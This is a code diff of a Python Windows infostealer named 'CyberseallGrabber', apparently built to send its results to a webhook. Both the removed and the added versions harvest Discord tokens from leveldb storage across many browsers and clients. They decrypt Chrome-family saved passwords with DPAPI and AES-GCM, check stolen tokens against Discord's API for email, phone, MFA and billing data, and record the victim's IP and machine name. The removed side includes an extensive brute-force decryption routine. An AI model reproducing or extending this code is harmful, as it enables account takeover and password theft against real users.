@@ -1,35 +1,6 @@
-import os
-import re
-import requests
-import base64
-import getpass
-import sqlite3
-import shutil
-import platform
-import socket
-import json
-import zipfile
-import time
-import win32crypt
-import threading
-import psutil
-import subprocess
-
-try:
-    import websocket
-except ImportError:
-    subprocess.run([__import__('sys').executable, '-m', 'pip', 'install', 'websocket-client', '--quiet'], capture_output=True)
-    import websocket
-
-try:
-    from Crypto.Cipher import AES, ChaCha20_Poly1305
-except:
-    __import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome',''])
-    try:
-        from Crypto.Cipher import AES, ChaCha20_Poly1305
-    except:
-        from Crypto.Cipher import AES
-        ChaCha20_Poly1305 = None
+import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
+try:from Crypto.Cipher import AES
+except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome',''])
 
 class CyberseallGrabber:
     def __init__(self, webhook_url):
@@ -74,45 +45,9 @@ class CyberseallGrabber:
         try:
             def decrypt(buff, master_key):
                 try:
-                    # Methode 1: Standard AES-GCM
-                    decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    cipher = AES.new(decrypted_key, AES.MODE_GCM, buff[3:15])
-                    decrypted = cipher.decrypt(buff[15:])[:-16].decode()
-                    return decrypted
+                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                 except:
-                    try:
-                        # Methode 2: Direkter DPAPI
-                        result = win32crypt.CryptUnprotectData(buff, None, None, None, 0)
-                        if result and result[1]:
-                            return result[1].decode('utf-8', errors='ignore')
-                    except:
-                        pass
-                    
-                    try:
-                        # Methode 3: Verschiedene IV Positionen
-                        decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                        for iv_start in [3, 0, 12]:
-                            for iv_len in [12, 16, 8]:
-                                if len(buff) >= iv_start + iv_len + 16:
-                                    iv = buff[iv_start:iv_start + iv_len]
-                                    encrypted_data = buff[iv_start + iv_len:]
-                                    cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
-                                    decrypted = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
-                                    if len(decrypted) > 10:
-                                        return decrypted
-                    except:
-                        pass
-                    
                     return "Error"
-            
-            def getip():
-                ip = "None"
-                try:
-                    import urllib.request
-                    ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
-                except: 
-                    pass
-                return ip
             
             tokens = []
             cleaned = []
@@ -123,30 +58,13 @@ class CyberseallGrabber:
             roaming = os.getenv('APPDATA')
             chrome = local + "\\Google\\Chrome\\User Data"
             
-            paths = {}
-            
-            # Discord Apps
-            discord_apps = {
+            paths = {
                 'Discord': roaming + '\\discord',
                 'Discord Canary': roaming + '\\discordcanary',
+                'Lightcord': roaming + '\\Lightcord',
                 'Discord PTB': roaming + '\\discordptb',
-                'Discord Development': roaming + '\\discorddevelopment',
-                'Lightcord': roaming + '\\Lightcord'
-            }
-            
-            # Browser Apps mit mehreren Profilen
-            browser_bases = {
-                'Chrome': local + '\\Google\\Chrome\\User Data',
-                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-                'Edge': local + '\\Microsoft\\Edge\\User Data',
-                'Edge Beta': local + '\\Microsoft\\Edge Beta\\User Data',
-                'Edge Dev': local + '\\Microsoft\\Edge Dev\\User Data',
-                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
                 'Opera': roaming + '\\Opera Software\\Opera Stable',
                 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-                'Vivaldi': local + '\\Vivaldi\\User Data',
-                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
                 'Amigo': local + '\\Amigo\\User Data',
                 'Torch': local + '\\Torch\\User Data',
                 'Kometa': local + '\\Kometa\\User Data',
@@ -154,63 +72,28 @@ class CyberseallGrabber:
                 'CentBrowser': local + '\\CentBrowser\\User Data',
                 '7Star': local + '\\7Star\\7Star\\User Data',
                 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-                'Uran': local + '\\uCozMedia\\Uran\\User Data',
-                'Iridium': local + '\\Iridium\\User Data'
+                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+                'Chrome': chrome + '\\Default',
+                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
+                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+                'Iridium': local + '\\Iridium\\User Data\\Default'
             }
             
-            # Füge Discord Apps hinzu
-            for name, path in discord_apps.items():
-                if os.path.exists(path):
-                    paths[name] = path
-            
-            # Füge Browser mit Profilen hinzu
-            for browser_name, base_path in browser_bases.items():
-                if os.path.exists(base_path):
-                    # Prüfe alle verfügbaren Profile (erweitert auf 10 Profile)
-                    for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5', 'Profile 6', 'Profile 7', 'Profile 8', 'Profile 9', 'Profile 10']:
-                        profile_path = os.path.join(base_path, profile)
-                        if os.path.exists(profile_path):
-                            paths[f'{browser_name}-{profile}'] = profile_path
-                    
-                    # Zusätzlich: Automatische Erkennung aller Profile
-                    try:
-                        for item in os.listdir(base_path):
-                            item_path = os.path.join(base_path, item)
-                            if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                if f'{browser_name}-{item}' not in paths:
-                                    paths[f'{browser_name}-{item}'] = item_path
-                    except:
-                        pass
-                    
-                    # Fallback für Browser ohne Profile
-                    if browser_name not in [p.split('-')[0] for p in paths.keys()]:
-                        paths[browser_name] = base_path
-            
-            # Sammle alle verfügbaren Schlüssel
-            encryption_keys = {}
-            
             for platform, path in paths.items():
-                if not os.path.exists(path):
+                if not os.path.exists(path): 
                     continue
-                
-                # Versuche verschiedene Local State Pfade
-                local_state_paths = [
-                    os.path.join(path, "Local State"),
-                    os.path.join(os.path.dirname(path), "Local State")
-                ]
-                
-                key = None
-                for state_path in local_state_paths:
-                    try:
-                        if os.path.exists(state_path):
-                            with open(state_path, "r") as file:
-                                key = json.loads(file.read())['os_crypt']['encrypted_key']
-                                encryption_keys[platform] = key
-                                break
-                    except: 
-                        continue
+                try:
+                    with open(path + f"\\Local State", "r") as file:
+                        key = json.loads(file.read())['os_crypt']['encrypted_key']
+                        file.close()
+                except: 
+                    continue
                     
-                leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                 if not os.path.exists(leveldb_path):
                     continue
                     
@@ -218,171 +101,72 @@ class CyberseallGrabber:
                     if not file.endswith(".ldb") and not file.endswith(".log"): 
                         continue
                     try:
-                        file_path = os.path.join(leveldb_path, file)
-                        with open(file_path, "r", errors='ignore') as files:
-                            content = files.read()
-                            # Verschiedene Token-Pattern
-                            patterns = [
-                                r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)",
-                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
-                                r"mfa\.[\w-]{84}",
-                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
-                                r"[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}",
-                                r"mfa\.[A-Za-z0-9_-]{84}",
-                                # Neue Pattern für andere verschlüsselte Tokens
-                                r"djEw([A-Za-z0-9+/=]+)"
-                            ]
-                            
-                            for pattern in patterns:
-                                matches = re.findall(pattern, content)
-                                for match in matches:
-                                    if match and match not in tokens:
-                                        token_data = {
-                                            'token': match,
-                                            'platform': platform,
-                                            'key': key
-                                        }
-                                        if pattern.startswith(r"dQw4w9WgXcQ"):
-                                            # Für verschlüsselte Tokens
-                                            tokens.append(("dQw4w9WgXcQ:" + match, platform, key))
-                                        elif pattern.startswith(r"djEw"):
-                                            # Für djEw verschlüsselte Tokens
-                                            tokens.append(("djEw" + match, platform, key))
-                                        else:
-                                            # Für direkte Tokens
-                                            tokens.append((match, platform, key))
+                        with open(leveldb_path + file, "r", errors='ignore') as files:
+                            for x in files.readlines():
+                                x.strip()
+                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                    tokens.append(values)
                     except PermissionError: 
                         continue
             
-            for token_data in tokens:
-                if token_data and len(token_data) == 3:
-                    token, platform, key = token_data
-                    if token:
-                        # Bereinige Token
-                        clean_token = token.strip().replace("\\", "").replace("\n", "").replace("\r", "")
-                        if clean_token and len(clean_token) > 10:
-                            cleaned.append((clean_token, platform, key))
+
+            for i in tokens:
+                if i.endswith("\\"):
+                    i = i.replace("\\", "")
+                if i not in cleaned:
+                    cleaned.append(i)
             
-            for token_data in cleaned:
+
+            for token in cleaned:
                 try:
-                    if len(token_data) == 3:
-                        token, platform, key = token_data
-                    else:
-                        continue
-                        
                     if 'dQw4w9WgXcQ:' in token:
-                        encrypted_part = token.split('dQw4w9WgXcQ:')[1]
-                        if encrypted_part and key:
-                            try:
-                                decoded_token = base64.b64decode(encrypted_part)
-                                master_key = base64.b64decode(key)[5:]
-                                tok = decrypt(decoded_token, master_key)
-                                if tok != "Error" and len(tok) > 20:
-                                    checker.append(tok)
-                            except:
-                                # Versuche direkten Token
-                                if len(encrypted_part) > 50 and '.' in encrypted_part:
-                                    checker.append(encrypted_part)
-                    elif token.startswith('djEw'):
-                        # djEw verschlüsselte Tokens
-                        encrypted_part = token[4:]  # Entferne 'djEw' Präfix
-                        if encrypted_part and key:
-                            try:
-                                decoded_token = base64.b64decode(encrypted_part)
-                                master_key = base64.b64decode(key)[5:]
-                                tok = decrypt(decoded_token, master_key)
-                                if tok != "Error" and len(tok) > 20:
-                                    checker.append(tok)
-                            except:
-                                # Versuche direkten Token
-                                if len(encrypted_part) > 50 and '.' in encrypted_part:
-                                    checker.append(encrypted_part)
-                    else:
-                        # Direkter Token ohne Verschlüsselung
-                        if len(token) > 50 and '.' in token:
-                            checker.append(token)
-                except Exception as e:
+                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
+                        if tok != "Error" and len(tok) > 50:
+                            checker.append(tok)
+                except:
                     continue
             
+
             for value in checker:
                 if value not in already_check:
                     already_check.append(value)
-                    headers = {'Authorization': value, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
+                    headers = {'Authorization': value, 'Content-Type': 'application/json'}
                     try:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
+
+                        res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+                        if res.status_code != 200:
+                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
+                        
                         if res.status_code == 200:
                             self.t.append(value)
                     except:
                         pass
             
-        except Exception as e:
-            # Einfache Fallback-Methode für Token-Suche
-            try:
-                fallback_tokens = []
-                
-                # Suche in Discord-Ordnern
-                discord_paths = [
-                    os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
-                    os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
-                    os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')
-                ]
-                
-                for path in discord_paths:
-                    if os.path.exists(path):
-                        for file in os.listdir(path):
-                            if file.endswith(('.ldb', '.log')):
-                                try:
-                                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
-                                        content = f.read()
-                                        # Suche nach aktuellen Token-Patterns
-                                        current_tokens = re.findall(r'[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}', content)
-                                        for token in current_tokens:
-                                            if token not in fallback_tokens and len(token) > 50:
-                                                fallback_tokens.append(token)
-                                except:
-                                    pass
-                
-                # Validiere Fallback-Tokens
-                for token in fallback_tokens[:15]:  # Erhöht von 5 auf 15 testen
-                    try:
-                        headers = {'Authorization': token, 'Content-Type': 'application/json'}
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
-                        if res.status_code == 200:
-                            self.t.append(token)
-                    except:
-                        pass
-            except:
-                pass
+        except:
+            pass
 
     def validate_tokens(self):
         valid_tokens = []
-        for token in self.t[:25]:  # Erhöht von 10 auf 25 Tokens
+        for token in self.t[:10]:
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                 
-                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
+
+                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+                if r.status_code != 200:
+                    r = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                 
-                if res.status_code == 200:
-                    res_json = res.json()
-                    
-                    try:
-                        import urllib.request
-                        ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
-                    except:
-                        ip = "None"
-                    
-                    pc_username = os.getenv("UserName", "Unknown")
-                    pc_name = os.getenv("Computername", "Unknown")
-                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
-                    user_id = res_json['id']
-                    email = res_json['email']
-                    phone = res_json['phone']
-                    mfa_enabled = res_json['mfa_enabled']
+                if r.status_code == 200:
+                    user_data = r.json()
                     
                     has_nitro = False
                     days_left = 0
                     try:
-                        nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
+
+                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
+                        if nitro_res.status_code != 200:
+                            nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
+                        
                         if nitro_res.status_code == 200:
                             nitro_data = nitro_res.json()
                             has_nitro = bool(len(nitro_data) > 0)
@@ -394,23 +178,33 @@ class CyberseallGrabber:
                     except:
                         pass
                     
+
+                    try:
+                        import socket
+                        ip = "None"
+                        try:
+                            import urllib.request
+                            ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
+                        except:
+                            ip = socket.gethostbyname(socket.gethostname())
+                    except:
+                        ip = "None"
+                    
                     token_info = {
                         'token': token,
-                        'username': res_json.get('username', 'Unknown'),
-                        'discriminator': res_json.get('discriminator', '0000'),
-                        'id': user_id,
-                        'email': email,
-                        'phone': phone,
-                        'verified': res_json.get('verified', False),
-                        'mfa_enabled': mfa_enabled,
-                        'premium_type': res_json.get('premium_type', 0),
+                        'username': user_data.get('username', 'Unknown'),
+                        'discriminator': user_data.get('discriminator', '0000'),
+                        'id': user_data.get('id', 'Unknown'),
+                        'email': user_data.get('email', 'Hidden'),
+                        'phone': user_data.get('phone', 'None'),
+                        'verified': user_data.get('verified', False),
+                        'mfa_enabled': user_data.get('mfa_enabled', False),
+                        'premium_type': user_data.get('premium_type', 0),
                         'has_nitro': has_nitro,
                         'nitro_days_left': days_left,
                         'ip': ip,
-                        'pc_username': pc_username,
-                        'pc_name': pc_name,
-                        'user_name': user_name,
-                        'platform': 'Discord'
+                        'pc_username': os.getenv("UserName", "Unknown"),
+                        'pc_name': os.getenv("Computername", "Unknown")
                     }
                     valid_tokens.append(token_info)
             except:
@@ -420,318 +214,64 @@ class CyberseallGrabber:
     def pw(self):
         try:
             def decrypt_password(password, key):
-                """
-                ULTIMATE DECRYPTION ENGINE - 15+ Methoden für maximale Recovery
-                """
                 try:
                     if not password or len(password) < 3:
                         return "Failed to decrypt"
 
-                    # METHODE 1: Chrome v10/v11/v20 AES-GCM
+
                     try:
-                        if password[:3] in [b'v10', b'v11', b'v20']:
+                        if password[:3] == b'v10' or password[:3] == b'v11':
                             iv = password[3:15]
                             encrypted_data = password[15:]
                             cipher = AES.new(key, AES.MODE_GCM, iv)
                             decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                            if decrypted_pass and len(decrypted_pass) > 0 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                            if decrypted_pass and len(decrypted_pass) > 0:
                                 return decrypted_pass
                     except:
                         pass
 
-                    # METHODE 2: ULTIMATE v20 APP-BOUND ENCRYPTION
-                    try:
-                        if password[:3] == b'v20':
-                            # v20 verwendet App-Bound Encryption - versuche verschiedene Ansätze
-                            
-                            # Standard v20 Struktur: [v20|iv(12)|ciphertext|tag(16)]
-                            try:
-                                password_iv = password[3:3+12]
-                                encrypted_password = password[3+12:-16]
-                                password_tag = password[-16:]
-                                
-                                if len(password_iv) == 12 and len(password_tag) == 16:
-                                    cipher = AES.new(key, AES.MODE_GCM, nonce=password_iv)
-                                    decrypted_password = cipher.decrypt_and_verify(encrypted_password, password_tag)
-                                    result = decrypted_password.decode('utf-8', errors='ignore')
-                                    if result and len(result) >= 3:
-                                        return result
-                            except:
-                                pass
-                            
-                            # Fallback: Versuche verschiedene Strukturen
-                            for iv_start in [3, 4]:
-                                for iv_len in [12, 16]:
-                                    for tag_len in [16, 12]:
-                                        try:
-                                            if len(password) >= iv_start + iv_len + tag_len:
-                                                iv = password[iv_start:iv_start+iv_len]
-                                                encrypted_data = password[iv_start+iv_len:-tag_len]
-                                                tag = password[-tag_len:]
-                                                
-                                                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
-                                                decrypted = cipher.decrypt_and_verify(encrypted_data, tag)
-                                                result = decrypted.decode('utf-8', errors='ignore')
-                                                if result and len(result) >= 3:
-                                                    return result
-                                        except:
-                                            pass
-                    except:
-                        pass
 
-                    # METHODE 3: Standard AES-GCM ohne Version-Check
                     try:
                         if len(password) >= 15:
                             iv = password[3:15]
                             encrypted_data = password[15:]
                             cipher = AES.new(key, AES.MODE_GCM, iv)
                             decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                            if decrypted_pass and len(decrypted_pass) > 0 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
+                            if decrypted_pass and len(decrypted_pass) > 0:
                                 return decrypted_pass
                     except:
                         pass
 
-                    # METHODE 4: Direkter DPAPI
+
                     try:
                         result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                         if result and result[1]:
-                            decrypted = result[1].decode('utf-8', errors='ignore') if isinstance(result[1], bytes) else str(result[1])
-                            if decrypted and len(decrypted) > 0 and not any(c in decrypted for c in ['\x00', '\ufffd']):
+                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
+                            if decrypted and len(decrypted) > 0:
                                 return decrypted
                     except:
                         pass
 
-                    # METHODE 5: Erweiterte IV-Positionen und Tag-Längen
-                    try:
-                        for iv_start in [0, 3, 12, 16]:
-                            for iv_len in [8, 12, 16, 24]:
-                                for tag_len in [16, 12, 8]:
-                                    if len(password) >= iv_start + iv_len + tag_len:
-                                        iv = password[iv_start:iv_start + iv_len]
-                                        encrypted_data = password[iv_start + iv_len:]
-                                        cipher = AES.new(key, AES.MODE_GCM, iv)
-                                        decrypted_pass = cipher.decrypt(encrypted_data[:-tag_len]).decode('utf-8', errors='ignore')
-                                        if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
-                                            return decrypted_pass
-                    except:
-                        pass
 
-                    # METHODE 5: AES-CBC Modus
                     try:
-                        for iv_start in [0, 3, 16]:
-                            for iv_len in [16]:
+                        for iv_start in [3, 0, 12]:
+                            for iv_len in [12, 16, 8]:
                                 if len(password) >= iv_start + iv_len + 16:
                                     iv = password[iv_start:iv_start + iv_len]
                                     encrypted_data = password[iv_start + iv_len:]
-                                    cipher = AES.new(key[:16], AES.MODE_CBC, iv)
-                                    decrypted_pass = cipher.decrypt(encrypted_data).decode('utf-8', errors='ignore').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10')
-                                    if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\ufffd']):
+                                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                                    if decrypted_pass and len(decrypted_pass) > 0:
                                         return decrypted_pass
                     except:
                         pass
 
-                    # METHODE 6: Verschiedene Schlüssellängen
-                    try:
-                        for key_len in [16, 24, 32]:
-                            if len(key) >= key_len and len(password) >= 15:
-                                iv = password[3:15]
-                                encrypted_data = password[15:]
-                                cipher = AES.new(key[:key_len], AES.MODE_GCM, iv)
-                                decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
-                                if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
-                                    return decrypted_pass
-                    except:
-                        pass
 
-                    # METHODE 7: XOR mit verschiedenen Keys
-                    try:
-                        for xor_key in [key[:16], key[-16:], key[:8] * 2]:
-                            if len(xor_key) > 0:
-                                xor_result = bytes(a ^ b for a, b in zip(password, (xor_key * (len(password) // len(xor_key) + 1))[:len(password)]))
-                                try:
-                                    decrypted_pass = xor_result.decode('utf-8', errors='ignore')
-                                    if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
-                                        return decrypted_pass
-                                except:
-                                    pass
-                    except:
-                        pass
-
-                    # METHODE 8: Base64 Dekodierung
-                    try:
-                        import base64
-                        b64_decoded = base64.b64decode(password)
-                        if len(b64_decoded) >= 15:
-                            iv = b64_decoded[3:15]
-                            encrypted_data = b64_decoded[15:]
-                            cipher = AES.new(key, AES.MODE_GCM, iv)
-                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
-                            if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
-                                return decrypted_pass
-                    except:
-                        pass
-
-                    # METHODE 9: Verschiedene Encodings
-                    try:
-                        for encoding in ['latin1', 'cp1252', 'iso-8859-1', 'utf-16le']:
-                            try:
-                                if isinstance(password, bytes):
-                                    decoded = password.decode(encoding, errors='ignore')
-                                    if decoded and len(decoded) > 2 and not any(c in decoded for c in ['\x00', '\ufffd']):
-                                        return decoded
-                            except:
-                                pass
-                    except:
-                        pass
-
-                    # METHODE 10: Brute Force verschiedene Offsets
-                    try:
-                        for offset in range(1, min(len(password), 10)):
-                            shifted = password[offset:] + password[:offset]
-                            if len(shifted) >= 15:
-                                iv = shifted[3:15]
-                                encrypted_data = shifted[15:]
-                                cipher = AES.new(key, AES.MODE_GCM, iv)
-                                decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
-                                if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
-                                    return decrypted_pass
-                    except:
-                        pass
-
-                    # METHODE 11: ULTIMATE PARTIAL RECOVERY
                     try:
                         if isinstance(password, bytes) and len(password) > 10:
-                            # Versuche verschiedene Bereiche zu extrahieren
-                            best_result = ""
-                            for start in range(0, min(len(password), 30), 1):
-                                for end in range(start + 6, len(password) + 1, 1):
-                                    chunk = password[start:end]
-                                    # Extrahiere nur druckbare ASCII-Zeichen
-                                    printable_chars = ''.join(chr(c) for c in chunk if 32 <= c <= 126)
-                                    if len(printable_chars) >= 6:
-                                        # Prüfe ob es ein sinnvolles Passwort sein könnte
-                                        if (any(char.isalnum() for char in printable_chars) and
-                                            not printable_chars.startswith('v20') and
-                                            len(printable_chars) > len(best_result)):
-                                            best_result = printable_chars
-                            
-                            if len(best_result) >= 6:
-                                return best_result
-                    except:
-                        pass
-
-                    # METHODE 12: V20 ALTERNATIVE SCHLÜSSEL-ABLEITUNG
-                    try:
-                        if password[:3] == b'v20':
-                            # v20 könnte eine andere Schlüssel-Ableitung verwenden
-                            import hashlib
-                            
-                            # Versuche verschiedene Schlüssel-Ableitungen
-                            key_variants = [
-                                key,
-                                hashlib.sha256(key).digest()[:32],  # SHA256 des Master Keys
-                                hashlib.md5(key).digest() * 2,      # MD5 doppelt
-                                key[:16] + key[:16],                # Erste 16 Bytes doppelt
-                                key[-16:] + key[-16:],              # Letzte 16 Bytes doppelt
-                            ]
-                            
-                            for variant_key in key_variants:
-                                if len(variant_key) >= 16:
-                                    for iv_start in [3, 4]:
-                                        for iv_len in [12, 16]:
-                                            try:
-                                                if len(password) >= iv_start + iv_len + 16:
-                                                    iv = password[iv_start:iv_start+iv_len]
-                                                    encrypted_data = password[iv_start+iv_len:]
-                                                    cipher = AES.new(variant_key[:16], AES.MODE_GCM, iv)
-                                                    decrypted = cipher.decrypt(encrypted_data[:-16])
-                                                    
-                                                    for encoding in ['utf-8', 'latin1', 'cp1252']:
-                                                        try:
-                                                            decoded = decrypted.decode(encoding, errors='ignore')
-                                                            clean_decoded = ''.join(c for c in decoded if 32 <= ord(c) <= 126)
-                                                            if len(clean_decoded) >= 6 and any(c.isalnum() for c in clean_decoded):
-                                                                return clean_decoded
-                                                        except:
-                                                            pass
-                                            except:
-                                                pass
-                    except:
-                        pass
-
-                    # METHODE 13: AGGRESSIVE CHROME PROFILE DECRYPTION
-                    try:
-                        # Spezielle Behandlung für Chrome Profile 3 und ähnliche
-                        if len(password) >= 20:
-                            # Versuche verschiedene Schlüssel-Derivationen
-                            for key_variant in [key, key[:16], key[-16:], key[8:24]]:
-                                if len(key_variant) >= 16:
-                                    for iv_offset in range(0, min(len(password), 20)):
-                                        for data_offset in range(iv_offset + 12, min(len(password), iv_offset + 32)):
-                                            try:
-                                                iv = password[iv_offset:iv_offset + 12]
-                                                if len(iv) == 12:
-                                                    encrypted_data = password[data_offset:]
-                                                    if len(encrypted_data) >= 16:
-                                                        cipher = AES.new(key_variant[:16], AES.MODE_GCM, iv)
-                                                        decrypted = cipher.decrypt(encrypted_data[:-16])
-                                                        # Versuche verschiedene Dekodierungen
-                                                        for encoding in ['utf-8', 'latin1', 'cp1252']:
-                                                            try:
-                                                                result = decrypted.decode(encoding, errors='ignore')
-                                                                # Filtere nur sinnvolle Passwörter
-                                                                clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
-                                                                if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
-                                                                    return clean_result
-                                                            except:
-                                                                pass
-                                            except:
-                                                pass
-                    except:
-                        pass
-
-                    # METHODE 14: BRUTE FORCE KEY DERIVATION
-                    try:
-                        if len(password) >= 15 and len(key) >= 16:
-                            # Versuche verschiedene Key-Transformationen
-                            key_variants = [
-                                key,
-                                key[::-1],  # Reversed key
-                                bytes(a ^ b for a, b in zip(key, b'\x5A' * len(key))),  # XOR with pattern
-                                key[1:] + key[:1],  # Rotated key
-                                key[::2] + key[1::2],  # Interleaved key
-                            ]
-                            
-                            for variant_key in key_variants:
-                                if len(variant_key) >= 16:
-                                    try:
-                                        iv = password[3:15]
-                                        encrypted_data = password[15:]
-                                        cipher = AES.new(variant_key[:16], AES.MODE_GCM, iv)
-                                        decrypted = cipher.decrypt(encrypted_data[:-16])
-                                        result = decrypted.decode('utf-8', errors='ignore')
-                                        clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
-                                        if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
-                                            return clean_result
-                                    except:
-                                        pass
-                    except:
-                        pass
-
-                    # METHODE 15: LEGACY CHROME DECRYPTION
-                    try:
-                        # Für ältere Chrome-Versionen ohne v10/v11 Prefix
-                        if not password.startswith(b'v1') and len(password) >= 16:
-                            try:
-                                # Direkter DPAPI ohne Prefix
-                                result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
-                                if result and result[1]:
-                                    decrypted = result[1].decode('utf-8', errors='ignore')
-                                    clean_result = ''.join(c for c in decrypted if 32 <= ord(c) <= 126)
-                                    if len(clean_result) >= 3:
-                                        return clean_result
-                            except:
-                                pass
+                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
+                            if len(printable_chars) > 3:
+                                return f"Partial: {printable_chars[:50]}"
                     except:
                         pass
 
@@ -754,8 +294,7 @@ class CyberseallGrabber:
                 
                 for chrome_base in chrome_paths:
                     if os.path.exists(chrome_base):
-                        # Erweiterte Profil-Suche für Chrome
-                        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
+                        for profile in ["Default", "Profile 1", "Profile 2"]:
                             profile_path = os.path.join(chrome_base, profile)
                             if os.path.exists(profile_path):
                                 simple_browsers.append({
@@ -764,23 +303,6 @@ class CyberseallGrabber:
                                     "base_path": chrome_base,
                                     "login_file": "Login Data"
                                 })
-                        
-                        # Automatische Erkennung aller Chrome-Profile
-                        try:
-                            for item in os.listdir(chrome_base):
-                                item_path = os.path.join(chrome_base, item)
-                                if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                    # Prüfe ob bereits hinzugefügt
-                                    already_added = any(browser["name"] == f"Chrome-{item}" for browser in simple_browsers)
-                                    if not already_added:
-                                        simple_browsers.append({
-                                            "name": f"Chrome-{item}",
-                                            "path": item_path,
-                                            "base_path": chrome_base,
-                                            "login_file": "Login Data"
-                                        })
-                        except:
-                            pass
                 
 
                 edge_paths = [
@@ -791,8 +313,7 @@ class CyberseallGrabber:
                 
